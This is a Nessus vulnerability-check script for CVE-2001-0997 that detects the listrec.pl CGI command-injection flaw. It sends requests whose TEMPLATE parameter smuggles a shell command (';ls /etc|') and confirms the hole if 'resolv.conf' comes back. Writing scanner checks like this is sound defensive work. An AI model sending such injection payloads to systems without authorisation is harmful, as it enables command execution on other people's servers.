#
# This script written by Matt Moore <matt@westpoint.ltd.uk> 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10769);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2001-0997");
 
 name["english"] = "Checks for listrec.pl";
 script_name(english:name["english"]);
 
 desc["english"] = "The 'listrec.pl' cgi is installed. This CGI has
a security flaw that lets an attacker execute arbitrary
commands on the remote server, usually with the privileges of the web server. 

Solution: Remove it from /cgi-bin/common/.

Risk factor : High

References:
www.textor.com/index.html (vendor)
www.securitytracker.com/alerts/2001/Sep/1002404.html (advisory)
";



 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the listrec.pl CGI";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Matt Moore ",
		francais:"Ce script est Copyright (C) 2001  Matt Moore");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";

 script_family(english:family["english"], francais:family["francais"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


dir[0] = "/cgi-bin/common";
dir[1] = "/cgi-local";
dir[2] = "/cgi_bin";
dir[3] = "";

 for(i=0; dir[i]; i = i + 1)
 {
 item = string(dir[i], "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|");
 req = http_get(item:item, port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if("resolv.conf" >< res) {
  	 security_hole(port);
	 exit(0);
	}  
 }
 

foreach dir (cgi_dirs())
{
 item = string(dir, "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|");
 req = http_get(item:item, port:port);
 res =  http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if("resolv.conf" >< res)security_hole(port);
}

